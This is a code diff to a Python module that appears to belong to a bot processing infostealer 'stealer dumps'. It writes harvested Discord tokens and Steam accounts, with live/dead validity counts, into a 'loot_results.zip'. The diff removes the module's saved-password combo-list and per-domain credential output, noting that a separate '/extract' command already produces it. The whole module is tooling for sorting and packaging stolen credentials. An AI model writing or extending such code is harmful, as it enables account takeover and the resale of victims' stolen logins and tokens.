@@ -11,14 +11,17 @@ The on-disk layout of ``loot_results.zip`` is::
     loot_summary.txt
     discord_tokens.txt
     steam_accounts.txt
-    credentials/
-      ulp.txt
-      combo_all.txt
-      combo_structured.txt
-      combo_<target>.txt           # one per requested domain
 
 Empty sections are skipped so the user never receives a zip full of
 zero-byte placeholder files.
+
+What used to live here that no longer does:
+
+* tdata extraction — produced too many false positives on real-world
+  stealer dumps; the user explicitly asked for it to go.
+* Saved-password (ULP / combo) dumping — ``/extract`` already does that
+  through the ``/ulp`` and ``/combo`` modes. Having it inside ``/loot``
+  too just made the result zip duplicate output.
 """
 
 from __future__ import annotations
@@ -56,11 +59,8 @@ _LOOT_BUNDLE_LIMIT = getattr(
 LOOT_ALL = "loot_all"
 LOOT_DISCORD = "loot_discord"
 LOOT_STEAM = "loot_steam"
-LOOT_PASSWORDS = "loot_passwords"
 
-ALL_LOOT_BUCKETS = frozenset(
-    {LOOT_DISCORD, LOOT_STEAM, LOOT_PASSWORDS},
-)
+ALL_LOOT_BUCKETS = frozenset({LOOT_DISCORD, LOOT_STEAM})
 
 
 def _safe_label(value: str) -> str:
@@ -141,12 +141,10 @@ def _render_summary(
     dead_discord = sum(1 for t in result.discord if t.valid is False)
     unknown_discord = sum(1 for t in result.discord if t.valid is None)
     live_steam = sum(1 for a in result.steam if a.valid is True)
-    domains = sorted({c.domain for c in result.credentials if c.domain})
 
     run_all = not buckets
     show_discord = run_all or (buckets and LOOT_DISCORD in buckets)
     show_steam = run_all or (buckets and LOOT_STEAM in buckets)
-    show_passwords = run_all or (buckets and LOOT_PASSWORDS in buckets)
 
     lines = [
         "=== LOOT SUMMARY ===",
@@ -172,9 +170,6 @@ def _render_summary(
             )
         else:
             lines.append(f"Steam accounts     : {len(result.steam)}")
-    if show_passwords:
-        lines.append(f"Credentials        : {len(result.credentials)}")
-        lines.append(f"Unique domains     : {len(domains)}")
     if result.errors:
         lines.append("")
         lines.append("=== ERRORS ===")
@@ -234,9 +229,12 @@ def _stage_outputs(
     duration_s: float,
     settings: LootExtractionConfig,
 ) -> None:
-    """Materialise the loot result into ``loot_out_dir``."""
+    """Materialise the loot result into ``loot_out_dir``.
 
-    # ── summary ──────────────────────────────────────────────────
+    Empty buckets produce no files — the user never receives a zip
+    full of zero-byte placeholders.
+    """
+    # summary
     summary = _render_summary(
         result,
         archive_name=archive_name,
@@ -246,7 +244,7 @@ def _stage_outputs(
     )
     _write_text(os.path.join(loot_out_dir, "loot_summary.txt"), summary)
 
-    # ── tokens ───────────────────────────────────────────────────
+    # tokens
     if result.discord:
         discord_text = _render_discord_lines(result.discord)
         _write_text(
@@ -258,35 +256,6 @@ def _stage_outputs(
         _write_text(
             os.path.join(loot_out_dir, "steam_accounts.txt"), steam_text,
         )
-
-    # ── credentials ──────────────────────────────────────────────
-    if result.credentials:
-        cred_dir = os.path.join(loot_out_dir, "credentials")
-        os.makedirs(cred_dir, exist_ok=True)
-        _write_text(
-            os.path.join(cred_dir, "ulp.txt"),
-            loot_mod.build_ulp_text(result.credentials),
-        )
-        _write_text(
-            os.path.join(cred_dir, "combo_all.txt"),
-            loot_mod.build_combo_text(result.credentials),
-        )
-        _write_text(
-            os.path.join(cred_dir, "combo_structured.txt"),
-            loot_mod.build_structured_combo_text(result.credentials),
-        )
-        for domain in settings.target_domains:
-            targeted = loot_mod.filter_credentials(
-                result.credentials, [domain],
-            )
-            text = loot_mod.build_combo_text(targeted)
-            if text:
-                _write_text(
-                    os.path.join(
-                        cred_dir, f"combo_{_safe_label(domain)}.txt",
-                    ),
-                    text,
-                )
 
 
 def _run_loot_extraction(
